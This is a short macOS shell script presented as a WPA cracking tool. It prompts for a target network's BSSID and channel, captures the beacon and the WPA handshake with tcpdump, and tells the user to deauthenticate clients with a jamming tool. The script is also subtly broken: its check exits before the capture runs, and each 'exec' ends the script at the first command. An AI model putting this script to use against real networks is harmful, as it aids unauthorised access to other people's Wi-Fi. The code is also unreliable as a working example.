#!/bin/sh

##Needed Variables##
WHERE_INSTALL=""
CHOICE=""
BSSID=""
CHANNEL=""
##

##Condition checking for enviorment##
echo 'Checking for airport command in user PATH...'
if ! [ -x "$(command -v airport)" ]; then
  echo 'Error: airport command is not in PATH.'
  echo 'Would you like it to be linked into your PATH?'
  read -p 'y/n: ' CHOICE
  if [ ${CHOICE:?n} = 'y' ]; then
    echo 'please specify where the link should should be '
    read WHERE_INSTALL
    echo "install in $WHERE_INSTALL"
    exec ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport "$WHERE_INSTALL"
  else
    echo 'exiting...'
    exit 0
  fi
else 
  exit 0
fi
##

##Script to actually perform the WPA crack##
echo 'macOS 95% native WPA cracking tool'
echo 'Please enter the BSSID of the target: '
read -p "BSSID: " BSSID

echo 'Please enter the WiFi channel of the target: '
read -p "Channel Number: " CHANNEL

echo 'Now setting up system'
exec airport -z
exec airport -c"${CHANNEL:?Missing channel number}"

echo 'Collecting beason frame...'
exec tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en1 -w beacon.cap

echo 'Beacon frame collected, now beginning collection of handshake, please use WifiJam to deauth a target'
exec tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en1 -w handshake.cap

echo 'handshake frames collected'
echo 'now merging files'
exec mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
##
